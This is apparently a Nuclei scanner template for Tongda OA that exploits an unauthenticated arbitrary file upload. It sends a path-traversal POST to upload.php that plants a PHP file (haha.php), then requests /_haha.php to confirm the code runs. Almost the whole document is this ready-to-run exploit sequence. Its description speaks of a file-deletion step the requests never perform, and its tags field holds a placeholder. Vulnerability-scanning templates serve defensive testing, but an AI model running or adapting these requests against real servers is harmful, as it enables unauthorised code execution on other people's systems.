id: tongda-upload
info:
  name: tongda-upload
  author: apple
  severity: critical
  description: 通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传。
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/3a81e5cf6dc36962151e6b2ed07182341e5e35a8/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.6%20print.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE.md
  tags: tags
http:
  - raw:
      - |
        POST /general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.31.0
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close
        Content-Length: 169
        Content-Type: multipart/form-data; boundary=24e8ce51829a7e0c8cd8aa46f6306313

        --24e8ce51829a7e0c8cd8aa46f6306313
        Content-Disposition: form-data; name="FILE1"; filename="haha.php"

        <?php
            echo "123";
        ?>
        --24e8ce51829a7e0c8cd8aa46f6306313--
      - |
        GET /_haha.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.31.0
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close
        Content-Length: 0
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '123'
      - type: word
        part: header
        words:
          - '200'
